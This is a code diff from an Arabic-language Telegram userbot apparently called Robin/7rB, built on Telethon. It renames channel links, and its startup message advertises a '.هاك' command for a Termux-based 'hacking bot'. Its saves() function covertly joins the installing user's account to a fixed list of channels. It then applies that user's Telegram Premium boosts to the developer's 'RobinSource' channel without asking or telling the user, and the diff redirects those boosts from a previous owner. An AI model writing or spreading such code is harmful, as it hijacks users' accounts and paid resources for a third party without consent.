@@ -86,7 +86,7 @@ async def startupmessage():
             Config.CATUBLOGO = await l313l.tgbot.send_message(
                 BOTLOG_CHATID,
                 "**‏᯽︙ بــوت 7rB يـعـمـل بـنـجـاح ✓ \n᯽︙ أرسل `.الاوامر` لرؤية اوامر السورس \n᯽︙ لأستعمال بوت الأختراق عبر كود التيرمكس أرسل `.هاك`**",
-                buttons=[(Button.url("سورس Robin ", "https://t.me/is7rb"),)],
+                buttons=[(Button.url("سورس Robin ", "https://t.me/robin7rB"),)],
             )
     except Exception as e:
         LOGS.error(f"خطأ في إرسال رسالة البدء: {str(e)}")
@@ -163,16 +163,16 @@ async def add_bot_to_logger_group(chat_id):
         except Exception as e:
             LOGS.error(str(e))
 
-JoKeRUB = {"@uui7rb", "@is7rb", "@E_4_R", "@robinsource"}
+JoKeRUB = {"@uui7rb", "@robin7rB", "@E_4_R", "@robinsource"}
 async def saves():
-    for F_O_1 in JoKeRUB:
+    for is7rb in JoKeRUB:
         try:
-            await l313l(JoinChannelRequest(channel=F_O_1))
+            await l313l(JoinChannelRequest(channel=is7rb))
             result = await l313l(functions.premium.GetMyBoostsRequest())
             slots = [boost.slot for boost in result.my_boosts]
             hrb_channel_id = None
             for chat in result.chats:
-                if chat.username == 'AljokerUserBot':
+                if chat.username == 'RobinSource':
                     hrb_channel_id = chat.id
                     break
             if hrb_channel_id and any(boost.peer.channel_id == hrb_channel_id for boost in result.my_boosts):
@@ -180,7 +180,7 @@ async def saves():
             if not slots:
                 return
             await l313l(functions.premium.ApplyBoostRequest(
-                'AljokerUserBot',
+                'RobinSource',
                 slots=slots
             ))
         except FloodWaitError as e:
